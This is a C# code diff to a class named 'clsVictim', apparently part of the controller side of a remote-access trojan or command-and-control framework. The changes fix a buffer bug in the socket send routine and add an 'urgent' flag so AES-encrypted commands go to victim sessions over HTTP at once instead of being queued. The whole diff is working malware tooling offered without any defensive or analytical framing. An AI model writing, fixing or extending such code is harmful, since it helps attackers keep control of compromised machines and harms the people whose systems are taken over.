@@ -106,7 +106,7 @@ public class clsVictim
     {
         Send(Command, Param, Encoding.UTF8.GetBytes(data));
     }
-    public async void Send(int Command, int Param, byte[] buffer)
+    public void Send(int Command, int Param, byte[] buffer)
     {
         if (buffer != null)
         {
@@ -127,19 +127,19 @@ public class clsVictim
             }
         }
     }
-    public async Task Send(byte[] abBuffer)
+    public void Send(byte[] abBuffer)
     {
         if (abBuffer == null)
             return;
 
         try
         {
-            socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+            socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
             {
                 socket.EndSend(ar);
-            }), buffer);
+            }), abBuffer);
 
-            clsStore.sent_bytes += buffer.Length;
+            clsStore.sent_bytes += abBuffer.Length;
         }
         catch (Exception ex)
         {
@@ -160,7 +160,7 @@ public class clsVictim
             */
         }).Start();
     }
-    public void SendCommand(string command)
+    public void SendCommand(string command, bool bUrge = false)
     {
         switch (m_listener.m_protocol)
         {
@@ -171,16 +171,24 @@ public class clsVictim
                 fnSslSend(command);
                 break;
             case enListenerProtocol.HTTP:
-                var listener = (clsHttpListener)m_listener;
-                var pkt = new clsHttpResp(2, 0, Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv)));
-                fnEnqueue(pkt);
+                byte[] abCipher = Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv));
+                if (bUrge)
+                {
+                    Send(new clsHttpResp(2, 0, abCipher).fnGetBytes());
+                }
+                else
+                {
+                    var listener = (clsHttpListener)m_listener;
+                    var pkt = new clsHttpResp(2, 0, abCipher);
+                    fnEnqueue(pkt);
+                }
                 break;
         }
     }
 
-    public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
-    public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
-    public void fnSendCommand(List<string> lsMsg) => SendCommand(string.Join("|", lsMsg));
+    public void fnSendCommand(string szMsg, bool bUrge = false) => fnSendCommand(szMsg.Split('|'), bUrge);
+    public void fnSendCommand(string[] aMsg, bool bUrge = false) => fnSendCommand(aMsg.ToList(), bUrge);
+    public void fnSendCommand(List<string> lsMsg, bool bUrge = false) => SendCommand(string.Join("|", lsMsg), bUrge);
 
     public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|'));
     public void fnSslSend(string[] asMsg) => fnSslSend(asMsg.ToList());
